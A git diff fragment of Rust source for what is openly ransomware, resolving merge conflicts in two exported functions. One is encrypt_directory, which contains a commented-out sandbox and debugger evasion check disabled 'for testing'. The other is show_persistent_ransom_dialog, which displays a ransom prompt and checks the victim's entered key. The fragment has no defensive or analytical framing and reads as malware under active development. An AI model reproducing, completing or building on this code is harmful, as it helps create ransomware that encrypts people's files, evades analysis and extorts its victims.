@@ -66,17 +66,10 @@ pub extern "C" fn encrypt_directory(path: *const c_char, max_depth: u32) -> *mut
             }
 
             // EVASION: Check for debugging/analysis environment
-<<<<<<< HEAD
             //  if !evasion::should_execute() {
             //      return CString::new("ERROR:Environment check failed").unwrap().into_raw();
             //  }
             // desactivo esto con propositos de prueba
-=======
-          //  if !evasion::should_execute() {
-          //      return CString::new("ERROR:Environment check failed").unwrap().into_raw();
-          //  }
-           // desactivo esto con propositos de prueba
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             let c_str = std::ffi::CStr::from_ptr(path);
             let path_str = match c_str.to_str() {
                 Ok(s) => s,
@@ -315,7 +308,6 @@ pub extern "C" fn free_string(s: *mut c_char) {
 /// On error: "ERROR:error_message"
 #[no_mangle]
 pub extern "C" fn show_persistent_ransom_dialog(correct_key: *const c_char) -> *mut c_char {
-<<<<<<< HEAD
     let result = panic::catch_unwind(|| unsafe {
         if correct_key.is_null() {
             return CString::new("ERROR:Null key provided").unwrap().into_raw();
@@ -328,23 +320,6 @@ pub extern "C" fn show_persistent_ransom_dialog(correct_key: *const c_char) -> *
                 return CString::new("ERROR:Invalid UTF-8 in key")
                     .unwrap()
                     .into_raw()
-=======
-    let result = panic::catch_unwind(|| {
-        unsafe {
-            if correct_key.is_null() {
-                return CString::new("ERROR:Null key provided").unwrap().into_raw();
-            }
-
-            let key_c_str = std::ffi::CStr::from_ptr(correct_key);
-            let key_str = match key_c_str.to_str() {
-                Ok(s) => s,
-                Err(_) => return CString::new("ERROR:Invalid UTF-8 in key").unwrap().into_raw(),
-            };
-
-            match ransom_dialog::show_ransom_dialog(key_str) {
-                Ok(_) => CString::new("OK:User entered correct key").unwrap().into_raw(),
-                Err(e) => CString::new(format!("ERROR:{}", e)).unwrap().into_raw(),
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             }
         };
 
